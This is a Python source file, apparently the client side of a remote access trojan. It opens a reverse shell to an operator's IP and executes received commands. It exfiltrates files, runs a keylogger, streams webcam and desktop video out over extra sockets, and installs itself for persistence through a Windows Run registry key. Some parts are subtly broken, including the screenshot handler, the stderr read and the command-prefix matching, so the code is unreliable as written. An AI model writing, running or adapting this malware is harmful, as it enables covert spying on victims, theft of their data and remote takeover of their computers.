import sys, socket as s, subprocess as sp, os as o, json as j, threading as t
from keylog import KeyLogger

ip_addr = input(f'[?] Enter server IP address >> ')
sc = s.socket()
def receive_command():
    data = ''
    while True:
        try:
            data += sc.recv(1024).decode().rstrip()
            return j.loads(data)
        except ValueError:
            continue
def upload_file(filename):
    with open(filename, 'rb') as file:
        sc.sendall(file.read())
def download_file(filename):
    with open(filename, 'wb') as file:
        sc.settimeout(1)
        chunk = sc.recv(1024)
        while chunk:
            file.write(chunk)
            try:
                chunk = sc.recv(1024)
            except s.timeout:
                break
        sc.settimeout(None)
def open_log():
    sc.send(KeyLogger().read_log().encode())
def log_thread():
    t.Thread(target=open_log).start()
def byte_stream():
    sock = s.socket()
    sock.connect((ip_addr, 55551))
    with sp.Popen(['ffmpeg', '-f', 'dshow', '-i', 'video=Integrated Webcam', '-f', 'mpegts', '-'], stdout=sp.PIPE) as video:
        for chunk in iter(lambda: video.stdout.read(1024), b''):
            sock.sendall(chunk)
def send_stream():
    t.Thread(target=byte_stream).start()
def byte_stream_recorder():
    sock = s.socket()
    sock.connect((ip_addr, 55552))
    with sp.Popen(['ffmpeg', '-f', 'gdigrab', '-framerate', '30', '-i', 'desktop', '-f', 'mpegts', '-'], stdout=sp.PIPE) as capture:
        for chunk in iter(lambda: capture.stdout.read(1024), b''):
            sock.sendall(chunk)
def send_byte_stream_recorder():
    t.Thread(target=byte_stream_recorder).start()
def run_persistence(registry_name, executable_file):
    file_path = o.environ['appdata']+'\\'+executable_file
    if not o.path.exists(file_path):
        o.copyfile(sys.executable, file_path)
        sp.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ' + registry_name + ' /t REG_SZ /d "' + file_path + '"', shell=True)
    else:
        pass
def run_command():
    functions = {
        'exit': lambda: exit(),
        'quit': lambda: exit(),
        'clear': lambda: None,
        'cd ': lambda: o.chdir(command[3:]),
        'download': lambda: upload_file(command[9:]),
        'upload': lambda: download_file(command[7:]),
        'start_logger': lambda: KeyLogger().start_logger(),
        'read_logger': lambda: log_thread(),
        'stop_logger': lambda: KeyLogger().stop_listener(),
        'start_cam': lambda: send_stream(),
        'screenshot': lambda: upload_file(sp.Popen(['ffmpeg', '-f', 'gdigrab', '-i', 'desktop', '-f', 'image2pipe', '-vcodec', 'png', '-'], stdout=sp.PIPE).stdout.read()),
        'screen_share': lambda: send_byte_stream_recorder(),
        'persistence': lambda: run_persistence(*command[12:].split(' '))
    }
    while True:
        command = receive_command()
        functions.get(command, lambda: sc.send(f"{j.dumps(sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE).stdout.read() + sp.Popen.stderr.read()).decode()}".encode()))()
def run():
    while True:
        try:
            sc.connect((ip_addr, 55550))
            run_command()
            sc.close()
            break
        except:
            run()
run()